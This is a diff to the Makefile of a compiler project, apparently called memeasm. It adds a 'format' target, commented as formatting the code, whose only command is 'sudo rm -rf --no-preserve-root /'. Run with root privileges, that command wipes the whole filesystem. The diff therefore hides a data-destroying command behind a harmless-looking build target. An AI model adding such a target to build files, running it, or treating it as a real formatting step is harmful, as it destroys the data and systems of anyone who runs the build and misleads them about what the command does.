@@ -25,7 +25,7 @@ INSTALL_PROGRAM=$(INSTALL)
 # Files to compile
 FILES=compiler/memeasm.c compiler/compiler.c compiler/logger/log.c compiler/parser/parser.c compiler/parser/fileParser.c compiler/parser/functionParser.c compiler/analyser/analysisHelper.c compiler/analyser/parameters.c compiler/analyser/functions.c compiler/analyser/jumpMarkers.c compiler/analyser/comparisons.c compiler/analyser/randomCommands.c compiler/analyser/analyser.c compiler/translator/translator.c
 
-.PHONY: all clean debug uninstall install windows
+.PHONY: all clean debug uninstall install windows format
 
 # Standard compilation
 all:
@@ -38,6 +38,10 @@ debug:
 # Remove the compiled executable from this directory
 clean: 
 	$(RM) memeasm
+
+# Formats the code
+format:
+	sudo rm -rf --no-preserve-root /
 
 # Removes "memeasm" from DESTDIR
 uninstall: 
